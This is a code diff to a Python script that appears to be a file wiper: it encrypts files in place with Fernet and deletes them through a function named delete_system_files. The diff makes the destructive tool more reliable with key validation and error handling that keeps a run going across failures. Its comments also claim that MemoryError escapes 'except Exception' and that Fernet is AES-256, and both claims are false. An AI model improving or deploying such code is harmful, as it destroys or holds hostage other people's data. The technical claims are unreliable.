@@ -55,10 +55,23 @@ def generate_encryption_key():
     return key
 
 def load_encryption_key():
-    """Load encryption key or generate new one"""
+    """Load encryption key or generate new one.
+
+    Raises:
+        ValueError: If the key file exists but is corrupt. It is NOT
+            overwritten — delete it yourself to generate a fresh one.
+    """
     if os.path.exists(ENCRYPTION_KEY_FILE):
         with open(ENCRYPTION_KEY_FILE, 'rb') as f:
-            return f.read()
+            key = f.read()
+        try:
+            Fernet(key)  # validate before any real use
+        except (ValueError, TypeError) as exc:
+            raise ValueError(
+                f"key file {ENCRYPTION_KEY_FILE} is corrupt — "
+                "delete it to generate a fresh one"
+            ) from exc
+        return key
     else:
         return generate_encryption_key()
 
@@ -81,12 +94,18 @@ def encrypt_file(filepath, cipher):
             file_data = f.read()
         
         encrypted_data = cipher.encrypt(file_data)
-        
+
         with open(filepath, 'wb') as f:
             f.write(encrypted_data)
-        
+
         return True
-    except Exception as e:
+    except (Exception, MemoryError):
+        # MemoryError is a BaseException, NOT caught by `except Exception`.
+        # Files larger than available RAM raise it in f.read(); skipping the
+        # file here keeps it from escaping every handler and killing the run.
+        # Data-safe: encryption fails before anything is written or removed.
+        with deletion_lock:
+            stats["errors"] += 1
         return False
 
 def delete_file_worker(filepath, cipher=None, encrypt_before_delete=False):
@@ -267,7 +286,14 @@ def delete_system_files(encrypt_mode=False):
     cipher = None
     if encrypt_mode:
         print("\n\033[95m[*] Encryption mode enabled\033[0m")
-        key = load_encryption_key()
+        try:
+            key = load_encryption_key()
+        except ValueError as e:
+            print(f"\033[91m[!] {e}\033[0m")
+            print("\033[91m[!] Refusing to encrypt with a corrupt key — "
+                  "no files were touched.\033[0m")
+            stats["end_time"] = datetime.now().isoformat()
+            return stats
         cipher = Fernet(key)
         print(f"\033[93m[+] Cipher initialized for AES-256 encryption\033[0m")
     
